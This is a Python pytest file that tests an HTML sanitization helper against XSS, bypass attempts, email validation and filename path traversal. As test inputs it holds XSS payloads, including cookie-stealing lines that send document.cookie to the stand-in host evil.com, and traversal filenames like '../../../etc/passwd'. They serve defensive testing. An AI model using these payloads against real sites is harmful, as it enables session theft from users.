#!/usr/bin/env python3
"""
🔒 Security Tests for HTML Sanitization

Tests for PR #3: HTML/XSS Sanitization Improvements

T1 Anchor: T1-SEC-TEST-004
SRB Anchor: SRB-SECURITY-TESTS-v1.0
DLP Context: security_testing_html_sanitization
"""

import importlib.util
import sys
from pathlib import Path

import pytest

# Import SecureHelpers from .security directory
_helpers_path = Path(__file__).parent.parent.parent / ".security" / "secure_helpers.py"
spec = importlib.util.spec_from_file_location("secure_helpers", _helpers_path)
secure_helpers = importlib.util.module_from_spec(spec)
sys.modules["secure_helpers"] = secure_helpers
spec.loader.exec_module(secure_helpers)
SecureHelpers = secure_helpers.SecureHelpers


# =============================================================================
# HTML Sanitization Tests
# =============================================================================

class TestHTMLSanitization:
    """Test HTML sanitization against XSS attacks."""
    
    def test_basic_html_escaping(self):
        """Test that basic HTML special characters are escaped."""
        malicious = '<script>alert("XSS")</script>'
        sanitized = SecureHelpers.sanitize_input(malicious)
        
        # After HTML escaping and script removal, should be safe
        # The HTML is escaped first, then script tags removed
        # Result should be safe (may be empty or have some remnants)
        assert '<script>' not in sanitized
        assert 'alert' not in sanitized or '&lt;' in sanitized
    
    def test_html_escaping_preserves_safe_content(self):
        """Test that safe content is preserved after escaping."""
        safe_input = "Hello World"
        sanitized = SecureHelpers.sanitize_input(safe_input)
        
        assert sanitized == "Hello World"
    
    def test_javascript_protocol_removed(self):
        """Test that javascript: protocol is removed."""
        malicious = '<a href="javascript:alert(\'XSS\')">Click me</a>'
        sanitized = SecureHelpers.sanitize_input(malicious)
        
        assert 'javascript:' not in sanitized.lower()
    
    def test_event_handler_removed(self):
        """Test that event handler attributes are removed."""
        test_cases = [
            '<img src=x onerror="alert(\'XSS\')">',
            '<body onload="alert(\'XSS\')">',
            '<div onclick="malicious()">',
            '<input onfocus="alert(1)">'
        ]
        
        for malicious in test_cases:
            sanitized = SecureHelpers.sanitize_input(malicious)
            # Event handlers should be removed
            assert 'onerror' not in sanitized.lower()
            assert 'onload' not in sanitized.lower()
            assert 'onclick' not in sanitized.lower()
            assert 'onfocus' not in sanitized.lower()
    
    def test_nested_script_bypass_prevented(self):
        """Test that nested script tags don't bypass sanitization."""
        malicious = '<scr<script>ipt>alert("XSS")</scr</script>ipt>'
        sanitized = SecureHelpers.sanitize_input(malicious)
        
        # After iterative sanitization, 'script' should be gone
        assert 'script' not in sanitized.lower()
    
    def test_data_uri_removed(self):
        """Test that data: URIs are removed (can contain scripts)."""
        malicious = '<img src="data:text/html,<script>alert(\'XSS\')</script>">'
        sanitized = SecureHelpers.sanitize_input(malicious)
        
        assert 'data:' not in sanitized.lower()
    
    def test_vbscript_protocol_removed(self):
        """Test that vbscript: protocol is removed."""
        malicious = '<img src="vbscript:msgbox(\'XSS\')">'
        sanitized = SecureHelpers.sanitize_input(malicious)
        
        assert 'vbscript:' not in sanitized.lower()
    
    def test_multiple_attack_vectors_combined(self):
        """Test sanitization against combined attack vectors."""
        malicious = (
            '<script>alert(1)</script>'
            '<img src=x onerror="alert(2)">'
            '<a href="javascript:alert(3)">test</a>'
        )
        sanitized = SecureHelpers.sanitize_input(malicious)
        
        # All attack vectors should be neutralized
        assert '<script>' not in sanitized.lower()
        assert 'onerror' not in sanitized.lower()
        assert 'javascript:' not in sanitized.lower()
    
    def test_case_insensitive_filtering(self):
        """Test that filtering works regardless of case."""
        test_cases = [
            '<SCRIPT>alert("XSS")</SCRIPT>',
            '<ScRiPt>alert("XSS")</ScRiPt>',
            'JAVASCRIPT:alert(1)',
            'JaVaScRiPt:alert(1)'
        ]
        
        for malicious in test_cases:
            sanitized = SecureHelpers.sanitize_input(malicious)
            assert 'script' not in sanitized.lower()
            assert 'javascript:' not in sanitized.lower()
    
    def test_length_truncation(self):
        """Test that long input is truncated."""
        long_input = 'A' * 2000
        sanitized = SecureHelpers.sanitize_input(long_input)
        
        # Should be truncated to max_length (1000 by default)
        assert len(sanitized) <= 1000
    
    def test_non_string_input_handled(self):
        """Test that non-string input is handled gracefully."""
        assert SecureHelpers.sanitize_input(None) == ""
        assert SecureHelpers.sanitize_input(12345) == ""
        assert SecureHelpers.sanitize_input([]) == ""
    
    def test_empty_string_preserved(self):
        """Test that empty string remains empty."""
        assert SecureHelpers.sanitize_input("") == ""
    
    def test_safe_content_preserved(self):
        """Test that safe content is preserved (after escaping)."""
        safe_input = "Hello, World! This is safe text."
        sanitized = SecureHelpers.sanitize_input(safe_input)
        
        # Should be preserved (though HTML-escaped if it had special chars)
        assert "Hello" in sanitized
        assert "World" in sanitized


class TestIterativeSanitization:
    """Test iterative sanitization to prevent bypass attempts."""
    
    def test_double_encoded_script(self):
        """Test protection against double-encoded attacks."""
        # This would become <script> after first decode
        malicious = '&lt;script&gt;alert(1)&lt;/script&gt;'
        sanitized = SecureHelpers.sanitize_input(malicious)
        
        # Should handle escaped versions too
        assert 'script' not in sanitized.lower()
    
    def test_iterative_removal_limits(self):
        """Test that iterative removal has limits to prevent DoS."""
        # Create deeply nested pattern that could cause infinite loop
        malicious = '<' * 100 + 'script' + '>' * 100
        
        # Should not hang or crash
        sanitized = SecureHelpers.sanitize_input(malicious)
        
        # Should complete and return sanitized result
        assert isinstance(sanitized, str)
        assert len(sanitized) <= 1000
    
    def test_mixed_case_nested_bypass(self):
        """Test nested bypass with mixed case."""
        malicious = '<scr<ScRiPt>ipt>alert(1)</scr</ScRiPt>ipt>'
        sanitized = SecureHelpers.sanitize_input(malicious)
        
        # Case-insensitive filtering should catch this
        assert 'script' not in sanitized.lower()


class TestXSSPreventionScenarios:
    """Test real-world XSS attack scenarios."""
    
    def test_reflected_xss_prevention(self):
        """Test prevention of reflected XSS attack."""
        # User input that would be reflected back to page
        user_input = '<script>document.cookie</script>'
        sanitized = SecureHelpers.sanitize_input(user_input)
        
        # Should be safe to display (script tags and content removed)
        assert '<script>' not in sanitized
        # After removal, may be empty or minimal content
        assert len(sanitized) < len(user_input) or 'script' not in sanitized.lower()
    
    def test_stored_xss_prevention(self):
        """Test prevention of stored XSS attack."""
        # Malicious input that might be stored in database
        stored_input = '"><script>alert(document.domain)</script>'
        sanitized = SecureHelpers.sanitize_input(stored_input)
        
        # Should be safe to retrieve and display
        assert '<script>' not in sanitized
    
    def test_dom_xss_prevention(self):
        """Test prevention of DOM-based XSS."""
        # Input that manipulates DOM
        dom_input = '<img src=x onerror="this.src=\'http://evil.com/?\'+document.cookie">'
        sanitized = SecureHelpers.sanitize_input(dom_input)
        
        # Event handler should be removed
        assert 'onerror' not in sanitized.lower()
    
    def test_svg_xss_prevention(self):
        """Test prevention of SVG-based XSS."""
        svg_input = '<svg onload="alert(1)">'
        sanitized = SecureHelpers.sanitize_input(svg_input)
        
        # SVG event handler should be removed
        assert 'onload' not in sanitized.lower()
    
    def test_comment_bypass_prevention(self):
        """Test that HTML comments don't allow bypass."""
        comment_input = '<!--<script>alert(1)</script>-->'
        sanitized = SecureHelpers.sanitize_input(comment_input)
        
        # Script within comment should still be neutralized
        assert 'script' not in sanitized.lower()


class TestInputValidation:
    """Test input validation security."""
    
    def test_input_length_validation(self):
        """Test input length validation."""
        long_input = 'A' * 2000
        
        # Using validate_input_length method
        with pytest.raises(ValueError, match="exceeds maximum length"):
            SecureHelpers.validate_input_length(long_input, max_length=1000)
    
    def test_input_length_validation_passes(self):
        """Test valid length input passes."""
        valid_input = 'A' * 500
        
        result = SecureHelpers.validate_input_length(valid_input, max_length=1000)
        
        assert result == valid_input
    
    def test_email_validation_valid(self):
        """Test email validation with valid emails."""
        valid_emails = [
            'user@example.com',
            'test.user@domain.co.uk',
            'user+tag@example.org'
        ]
        
        for email in valid_emails:
            assert SecureHelpers.validate_email(email)
    
    def test_email_validation_invalid(self):
        """Test email validation rejects invalid emails."""
        invalid_emails = [
            'not-an-email',
            '@example.com',
            'user@',
            'user @example.com',  # Space
            '<script>@example.com',  # XSS attempt
            'x' * 300 + '@example.com'  # Too long
        ]
        
        for email in invalid_emails:
            assert not SecureHelpers.validate_email(email)
    
    def test_filename_sanitization(self):
        """Test filename sanitization prevents path traversal."""
        dangerous_filenames = [  # nosec B108 - test data for security validation
            '../../../etc/passwd',
            'file<script>.txt',
            'test:file.txt',
            'file\\path\\traversal.txt',
            'file|pipe.txt',
            'file\x00null.txt'
        ]
        
        for filename in dangerous_filenames:
            sanitized = SecureHelpers.sanitize_filename(filename)
            
            # Should not contain dangerous characters (except .. may become _.._ which is safe)
            assert '<' not in sanitized
            assert '>' not in sanitized
            assert ':' not in sanitized
            assert '\\' not in sanitized
            assert '|' not in sanitized
            assert '\x00' not in sanitized
            # Should be a valid filename
            assert len(sanitized) > 0


# =============================================================================
# Integration Tests
# =============================================================================

class TestSanitizationIntegration:
    """Integration tests for sanitization in realistic scenarios."""
    
    def test_user_comment_sanitization(self):
        """Test sanitization of user-submitted comment."""
        # Realistic user comment with attempted XSS
        comment = '''
        This is a great product! <script>
        fetch('http://evil.com/steal?cookie=' + document.cookie)
        </script> I highly recommend it.
        '''
        
        sanitized = SecureHelpers.sanitize_input(comment)
        
        # Safe parts preserved
        assert 'great product' in sanitized
        assert 'recommend' in sanitized
        
        # Dangerous parts removed
        assert '<script>' not in sanitized
        assert 'fetch(' not in sanitized.lower() or 'script' not in sanitized.lower()
    
    def test_search_query_sanitization(self):
        """Test sanitization of search query."""
        # User search with attempted XSS
        search_query = '<img src=x onerror="alert(document.cookie)">'
        
        sanitized = SecureHelpers.sanitize_input(search_query)
        
        # Should be safe to display in "You searched for: X"
        assert 'onerror' not in sanitized.lower()
        assert '&lt;' in sanitized  # HTML escaped
    
    def test_profile_name_sanitization(self):
        """Test sanitization of user profile name."""
        # Username with malicious content
        username = 'Admin<script>alert(1)</script>'
        
        sanitized = SecureHelpers.sanitize_input(username)
        
        # Admin part preserved, script removed
        assert 'Admin' in sanitized
        assert '<script>' not in sanitized
